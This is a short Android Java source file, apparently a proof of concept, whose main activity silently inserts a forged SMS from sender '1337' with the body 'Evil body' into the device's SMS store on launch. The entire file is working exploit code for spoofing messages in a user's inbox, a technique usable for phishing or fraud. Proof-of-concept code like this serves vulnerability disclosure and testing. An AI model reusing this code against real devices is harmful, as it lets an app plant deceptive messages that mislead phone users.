package poc.app;

import android.app.Activity;
import android.content.ContentValues;
import android.os.Bundle;
import android.os.SystemClock;
import android.provider.Telephony;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        ContentValues values = new ContentValues();
        values.put(Telephony.Sms.ADDRESS, "1337");
        values.put(Telephony.Sms.DATE, SystemClock.currentThreadTimeMillis());
        values.put(Telephony.Sms.BODY, "Evil body");
        getContentResolver().insert(Telephony.Sms.CONTENT_URI, values);
    }
}